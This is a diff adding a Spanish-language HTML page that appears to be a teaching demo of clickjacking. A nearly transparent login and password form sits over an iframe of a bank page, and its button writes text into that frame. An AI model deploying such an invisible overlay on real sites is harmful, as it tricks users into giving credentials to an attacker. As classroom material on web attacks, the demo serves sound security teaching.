@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PREMIOS</title>
+    <style>
+        #pirata {
+            width: 100%;
+            position: absolute;
+            top: 0px;
+            opacity: 0.01;
+            z-index: 10;
+        }
+        #banco {
+            width: 100%;
+            position: absolute;
+            top: 0px;
+        }
+        /*iframe {
+            overflow: hidden;
+        }*/
+        button {
+            background-color: black;
+        }
+    </style>
+</head>
+<body>
+    <!-- Simula ataque de Clickjackng -->
+    <div id="pirata">
+        <form name="formulario" action="">
+            <input type="text" name="login" />
+            <input type="password" name="password" />
+            <button name="btnAceptar" onclick="piratea();">Aceptar</button>
+        </form>
+    </div>
+    <div id="banco">
+        <iframe name="marcoObjetivo" src="banco.html" frameborder="0" width="100%" scrolling="no"></iframe>
+    </div>
+    <script>
+        function piratea() {
+/*            let formulario=document.getElementById("formulario");
+            formulario.preventDefault();*/
+            alert("Página pirata");
+            let objetivo=document.getElementById("marcoObjetivo");
+            console.log('objetivo='+objetivo);
+            
+            let contenido=objetivo.contentDocument || objetivo.contentWindow.document;
+            console.log('contenido='+contenido);
+            
+            contenido.open();
+            contenido.write("Escribo en iframe desde pirata");
+            contenido.close();
+
+        }
+/*        function escribeIframe() {
+            alert("Página pirata");
+            let objetivo=document.getElementById("marcoObjetivo");
+            let contenido=objetivo.contentDocument || objetivo.contentWindow.document;
+            contenido.open();
+            contenido.write("Escribo en iframe desde pirata");
+            contenido.close();
+        }*/
+/*       let boton=document.getElementById("btnAceptar");
+        boton.addEventListener('click', function () {
+                        alert("Página pirata");
+            let objetivo=document.getElementById("marcoObjetivo");
+            let contenido=objetivo.contentDocument || objetivo.contentWindow.document;
+            contenido.open();
+            contenido.write("Escribo en iframe desde pirata");
+            contenido.close();
+
+        }
+        );*/
+    </script>
+</body>
+</html>
